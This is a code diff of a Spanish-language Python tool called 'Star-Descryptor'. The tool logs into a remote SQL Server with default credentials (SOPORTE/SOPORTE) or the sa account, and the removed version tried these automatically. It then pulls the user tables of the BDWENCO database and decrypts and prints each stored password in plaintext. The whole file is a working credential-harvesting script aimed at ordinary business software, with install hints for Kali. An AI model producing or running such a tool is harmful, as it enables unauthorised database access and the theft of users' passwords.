@@ -2,7 +2,6 @@
 import sys
 import getpass
 
-# Banner generado letra por letra con asteriscos
 BANNER = """
  ****    ****    *    ****      ****   ****    ****   ****   *   *  ****   ****   ****
  *       *      * *   *  *     *   *  *      *      *       *   *  *   *  *   *  *   
@@ -11,13 +10,25 @@ BANNER = """
  ****    *   *       * *   *   ****   ****  ****     ****   *   *  *   *  ****   ****
 """
 
+# Colores ANSI
+VERDE   = "\033[92m"
+AMARILLO= "\033[93m"
+ROJO    = "\033[91m"
+CYAN    = "\033[96m"
+BOLD    = "\033[1m"
+RESET   = "\033[0m"
+
 def print_banner():
     linea = "=" * 90
-    print(linea)
-    print(BANNER)
-    print("       >> Star-Descryptor v1.6  |  by mr.r360  |  remoto360.com <<")
-    print(linea)
+    print(CYAN + linea + RESET)
+    print(CYAN + BANNER + RESET)
+    print(BOLD + "       >> Star-Descryptor v1.7  |  by mr.r360  |  remoto360.com <<" + RESET)
+    print(CYAN + linea + RESET)
     print()
+
+def ok(msg):   print(f"{VERDE}[+]{RESET} {msg}")
+def info(msg): print(f"{AMARILLO}[~]{RESET} {msg}")
+def err(msg):  print(f"{ROJO}[!]{RESET} {msg}")
 
 # ─────────────────────────────────────────────
 #  ALGORITMO DE DESCIFRADO
@@ -47,15 +58,63 @@ def descifrar(texto_cifrado):
 
 
 # ─────────────────────────────────────────────
-#  CONEXIÓN A SQL SERVER
+#  RECOLECCIÓN DE PARÁMETROS AL INICIO
+# ─────────────────────────────────────────────
+def pedir_parametros():
+    print(BOLD + "  [ CONFIGURACIÓN DE CONEXIÓN ]" + RESET)
+    print()
+
+    # IP
+    ip = input("  IP del servidor          : ").strip()
+    if not ip:
+        err("IP requerida.")
+        sys.exit(1)
+
+    # Instancia
+    print()
+    print("  Instancia SQL Server:")
+    print("  [1] Sin instancia (por defecto)")
+    print("  [2] SQLEXPRESS")
+    print("  [3] Ingresar manualmente")
+    op_inst = input("  Opción [1/2/3]           : ").strip()
+    if op_inst == "2":
+        instancia = "SQLEXPRESS"
+    elif op_inst == "3":
+        instancia = input("  Nombre de instancia      : ").strip() or None
+    else:
+        instancia = None
+
+    # Credenciales
+    print()
+    print("  Credenciales SQL Server:")
+    print("  [1] SOPORTE / SOPORTE (por defecto)")
+    print("  [2] sa / (ingresar contraseña)")
+    print("  [3] Ingresar usuario y contraseña manualmente")
+    op_cred = input("  Opción [1/2/3]           : ").strip()
+
+    if op_cred == "2":
+        sql_user = "sa"
+        sql_pass = getpass.getpass("  Contraseña sa            : ")
+    elif op_cred == "3":
+        sql_user = input("  Usuario                  : ").strip()
+        sql_pass = getpass.getpass("  Contraseña               : ")
+    else:
+        sql_user = "SOPORTE"
+        sql_pass = "SOPORTE"
+
+    return ip, instancia, sql_user, sql_pass
+
+
+# ─────────────────────────────────────────────
+#  CONEXIÓN
 # ─────────────────────────────────────────────
 def conectar(ip, sql_user, sql_pass, instancia=None):
     try:
         import pyodbc
     except ImportError:
-        print("\n[!] ERROR: pyodbc no está instalado.")
+        err("pyodbc no está instalado.")
         print("    Ejecuta : apt-get install -y python3-pyodbc")
-        print("    En Kali : pip3 install pyodbc --break-system-packages\n")
+        print("    En Kali : pip3 install pyodbc --break-system-packages")
         sys.exit(1)
 
     servidor = f"{ip}\\{instancia}" if instancia else ip
@@ -72,72 +131,55 @@ def conectar(ip, sql_user, sql_pass, instancia=None):
     for driver in drivers:
         try:
             conn = pyodbc.connect(f"DRIVER={{{driver}}};" + conn_str_base)
-            inst_str = f"\\{instancia}" if instancia else "(default)"
-            print(f"[+] Conectado | {ip}{inst_str} | usuario: {sql_user} | driver: {driver}")
+            inst_str = f"\\{instancia}" if instancia else ""
+            ok(f"Conectado a {ip}{inst_str} | usuario: {sql_user} | driver: {driver}")
             return conn
         except pyodbc.Error:
             continue
     return None
 
 
-def intentar_conexion(ip, instancia, sql_user, sql_pass):
-    inst_str = f"\\{instancia}" if instancia else "(sin instancia)"
-    print(f"[~] Probando {ip}{inst_str} | {sql_user} ...")
-    return conectar(ip, sql_user, sql_pass, instancia)
+# ─────────────────────────────────────────────
+#  LEER TABLAS
+# ─────────────────────────────────────────────
+def tabla_existe(conn, nombre):
+    cur = conn.cursor()
+    cur.execute("SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG='BDWENCO' AND TABLE_SCHEMA='dbo' AND TABLE_NAME=?", nombre)
+    return cur.fetchone()[0] > 0
+
+def leer_tabla(conn, tabla):
+    cur = conn.cursor()
+    if tabla == "USUARIO":
+        cur.execute("SELECT USU_CODIGO, EMP_CODIGO, USU_NOMBRE, USU_PASSWORD FROM BDWENCO.dbo.USUARIO ORDER BY USU_CODIGO")
+        cols = ["USU_CODIGO", "EMP_CODIGO", "USU_NOMBRE", "USU_PASSWORD"]
+    else:
+        cur.execute("SELECT USU_CODIGO, USU_NOMBRE, USU_PASSWORD, USU_CARGO, USU_ESTADO, USU_TIPO FROM BDWENCO.dbo.USUARIOS ORDER BY USU_CODIGO")
+        cols = ["USU_CODIGO", "USU_NOMBRE", "USU_PASSWORD", "USU_CARGO", "USU_ESTADO", "USU_TIPO"]
+    return cur.fetchall(), cols
 
 
 # ─────────────────────────────────────────────
-#  DETECTAR TABLA Y LEER USUARIOS
+#  MOSTRAR RESULTADOS CON COLOR
 # ─────────────────────────────────────────────
-def tabla_existe(conn, nombre_tabla):
-    cursor = conn.cursor()
-    cursor.execute("""
-        SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES
-        WHERE TABLE_CATALOG='BDWENCO' AND TABLE_SCHEMA='dbo' AND TABLE_NAME=?
-    """, nombre_tabla)
-    return cursor.fetchone()[0] > 0
+def mostrar_tabla(filas, cols, titulo):
+    if not filas:
+        info(f"Tabla {titulo} sin registros.")
+        return
 
-def contar_registros(conn, nombre_tabla):
-    cursor = conn.cursor()
-    cursor.execute(f"SELECT COUNT(*) FROM BDWENCO.dbo.{nombre_tabla}")
-    return cursor.fetchone()[0]
-
-def leer_tabla_usuario(conn):
-    cursor = conn.cursor()
-    cursor.execute("SELECT USU_CODIGO, EMP_CODIGO, USU_NOMBRE, USU_PASSWORD FROM BDWENCO.dbo.USUARIO ORDER BY USU_CODIGO")
-    return cursor.fetchall(), ["USU_CODIGO", "EMP_CODIGO", "USU_NOMBRE", "USU_PASSWORD"]
-
-def leer_tabla_usuarios(conn):
-    cursor = conn.cursor()
-    cursor.execute("SELECT USU_CODIGO, USU_NOMBRE, USU_PASSWORD, USU_CARGO, USU_ESTADO, USU_TIPO FROM BDWENCO.dbo.USUARIOS ORDER BY USU_CODIGO")
-    return cursor.fetchall(), ["USU_CODIGO", "USU_NOMBRE", "USU_PASSWORD", "USU_CARGO", "USU_ESTADO", "USU_TIPO"]
-
-def detectar_y_leer(conn):
-    for tabla, leer_fn in [("USUARIO", leer_tabla_usuario), ("USUARIOS", leer_tabla_usuarios)]:
-        if tabla_existe(conn, tabla):
-            count = contar_registros(conn, tabla)
-            if count > 0:
-                print(f"[+] Tabla detectada: {tabla} ({count} registros)")
-                return leer_fn(conn), tabla
-    print("[!] No se encontró tabla USUARIO ni USUARIOS con datos en BDWENCO.")
-    sys.exit(1)
-
-def mostrar_resultados(filas, cols, tabla):
     pwd_idx = cols.index("USU_PASSWORD")
     col_w = []
     for c in cols:
-        if c in ("USU_NOMBRE", "USU_CARGO"):
-            col_w.append(26)
-        elif c == "USU_PASSWORD":
-            col_w.append(22)
-        else:
-            col_w.append(12)
+        col_w.append(26 if c in ("USU_NOMBRE", "USU_CARGO") else 14)
+    col_w[pwd_idx] = 22
     col_w_full = col_w + [22]
-    headers_display = cols + ["PWD DESCIFRADO"]
+    headers = cols + ["PWD DESCIFRADO"]
+
     sep = "─" * (sum(col_w_full) + len(col_w_full) * 3 + 1)
 
+    print()
+    print(BOLD + CYAN + f"  ╔══ {titulo} ({len(filas)} registros) ══╗" + RESET)
     print(sep)
-    print(" " + " | ".join(h.ljust(col_w_full[i]) for i, h in enumerate(headers_display)))
+    print(" " + BOLD + " | ".join(h.ljust(col_w_full[i]) for i, h in enumerate(headers)) + RESET)
     print(sep)
 
     for row in filas:
@@ -147,13 +189,23 @@ def mostrar_resultados(filas, cols, tabla):
             pwd_dec = descifrar(pwd_enc) if pwd_enc else "(vacío)"
         except Exception as e:
             pwd_dec = f"[ERR:{e}]"
+
         fila_display = valores + [pwd_dec]
-        linea = " | ".join(str(v).ljust(col_w_full[i])[:col_w_full[i]] for i, v in enumerate(fila_display))
-        print(f" {linea}")
+        partes = []
+        for i, v in enumerate(fila_display):
+            celda = str(v).ljust(col_w_full[i])[:col_w_full[i]]
+            if i == len(fila_display) - 1:
+                # Contraseña descifrada en verde y negrita
+                partes.append(VERDE + BOLD + celda + RESET)
+            elif i == pwd_idx:
+                # Password cifrado en amarillo
+                partes.append(AMARILLO + celda + RESET)
+            else:
+                partes.append(celda)
+        print(" " + " | ".join(partes))
 
     print(sep)
-    print(f"\n[+] Total usuarios procesados: {len(filas)}")
-    print(f"[+] Star-Descryptor v1.6 — remoto360.com\n")
+    print()
 
 
 # ─────────────────────────────────────────────
@@ -161,62 +213,37 @@ def mostrar_resultados(filas, cols, tabla):
 # ─────────────────────────────────────────────
 print_banner()
 
-ip = input("  IP del servidor SQL Server  : ").strip()
-if not ip:
-    print("[!] IP requerida.")
-    sys.exit(1)
-
-conn    = None
-sa_pass = None
+ip, instancia, sql_user, sql_pass = pedir_parametros()
 
 print()
+info(f"Conectando a {ip}" + (f"\\{instancia}" if instancia else "") + " ...")
 
-# ── FASE 1: SOPORTE/SOPORTE sin instancia ──
-conn = intentar_conexion(ip, None, "SOPORTE", "SOPORTE")
-
-# ── FASE 2: SOPORTE/SOPORTE con SQLEXPRESS ──
+conn = conectar(ip, sql_user, sql_pass, instancia)
 if not conn:
-    conn = intentar_conexion(ip, "SQLEXPRESS", "SOPORTE", "SOPORTE")
-
-# ── FASE 3: pedir instancia manual con SOPORTE ──
-if not conn:
-    print(f"\n[!] No se pudo conectar con SOPORTE. Intentando con instancia manual...")
-    instancia_manual = input("  Nombre de instancia (Enter para omitir): ").strip() or None
-    if instancia_manual:
-        conn = intentar_conexion(ip, instancia_manual, "SOPORTE", "SOPORTE")
-
-# ── FASE 4: pedir contraseña sa ──
-if not conn:
-    print(f"\n[!] Falló SOPORTE/SOPORTE. Probando con usuario sa...")
-    sa_pass = getpass.getpass("  Contraseña del usuario sa   : ")
-
-    # sa sin instancia
-    conn = intentar_conexion(ip, None, "sa", sa_pass)
-
-    # sa con SQLEXPRESS
-    if not conn:
-        conn = intentar_conexion(ip, "SQLEXPRESS", "sa", sa_pass)
-
-    # sa con instancia manual (si se ingresó antes)
-    if not conn and 'instancia_manual' in dir() and instancia_manual:
-        conn = intentar_conexion(ip, instancia_manual, "sa", sa_pass)
-
-    # sa pidiendo nueva instancia
-    if not conn:
-        instancia_sa = input("  Instancia para sa (Enter para omitir): ").strip() or None
-        if instancia_sa:
-            conn = intentar_conexion(ip, instancia_sa, "sa", sa_pass)
-
-if not conn:
-    print("\n[!] Conexión fallida. Verifica IP, instancia, firewall o puerto 1433.")
+    err("Conexión fallida. Verifica IP, instancia, credenciales, firewall o puerto 1433.")
     sys.exit(1)
 
 try:
-    print("\n[~] Detectando tabla de usuarios...\n")
-    (filas, cols), tabla = detectar_y_leer(conn)
     print()
-    mostrar_resultados(filas, cols, tabla)
+    info("Buscando tablas de usuarios en BDWENCO...")
+
+    encontrado = False
+    for tabla in ["USUARIO", "USUARIOS"]:
+        if tabla_existe(conn, tabla):
+            filas, cols = leer_tabla(conn, tabla)
+            if filas:
+                encontrado = True
+                mostrar_tabla(filas, cols, tabla)
+            else:
+                info(f"Tabla {tabla} existe pero está vacía.")
+
+    if not encontrado:
+        err("No se encontraron datos en USUARIO ni USUARIOS.")
+
+    print(BOLD + f"[+] Star-Descryptor v1.7 — remoto360.com" + RESET)
+    print()
+
 except Exception as e:
-    print(f"[!] Error: {e}")
+    err(f"Error: {e}")
 finally:
     conn.close()
